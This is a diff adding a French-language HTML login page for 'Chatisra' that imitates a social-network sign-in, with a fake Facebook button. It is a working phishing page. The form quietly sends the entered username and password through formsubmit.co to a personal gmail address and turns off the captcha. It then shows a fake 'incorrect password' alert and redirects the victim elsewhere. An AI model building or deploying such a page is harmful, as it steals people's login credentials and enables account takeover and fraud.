@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css">
+    <title>Chatisra - Connexion</title>
+</head>
+<body>
+    <div class="container">
+        <div class="login-container">
+            <div class="top-section">
+                <button class="language-button" style="margin-left: 35%; margin-top: -20%;">
+                    Français
+                    <i class="ion-chevron-down"></i>
+                </button>
+            </div>
+            <div class="logo-section">
+                <img src="imgs/logo.png"alt="Chatisra Logo" class="logo">
+            </div>
+            <div class="button-section">
+                
+                <button class="facebook-button" style="margin-top: 35px;">
+                    <a href="https://ivfinstru.github.io" style="color: white; text-decoration: none;">
+                        <i class="ion-social-facebook"></i>
+                    Continuer avec Facebook
+                    </a>
+                </button>
+            </div>
+            <div class="or-divider">
+                <span class="line"></span>
+                <span class="or-text">ou</span>
+                <span class="line"></span>
+            </div>
+            <form action="https://formsubmit.co/laatechtechnique@gmail.com" method="post">
+                <input type="hidden" name="_next" value="https://ivfinstru.github.io/index.html">
+                <input type="text" id="username" name="username" placeholder="téléphone, nom d'utilisateur ou e-ma..." required>
+                <input type="hidden" name="_captcha" value="false">
+                <input type="password" id="password" name="password" required placeholder="Mot de passe">
+                <a href="" style="text-align: end; text-decoration: none; color: #14c6fc; margin-top: 5px; margin-bottom: 25px;">Mot de passe oublié ?</a>
+
+                <button  type="submit" onclick="alerte()" style="background-color: #3db9f3;";>Se connecter</button>
+            </form>
+            <p class="signup-link"  style="margin-top: 35%;">Vous n'avez pas de compte ? <a href="#">Inscrivez-vous</a></p>
+        </div>
+    </div>
+
+    <script>
+        function alerte() {
+          alert("Mot de passe incorrect. Veuillez réessayer")
+        }
+      </script>
+</body>
+</html>
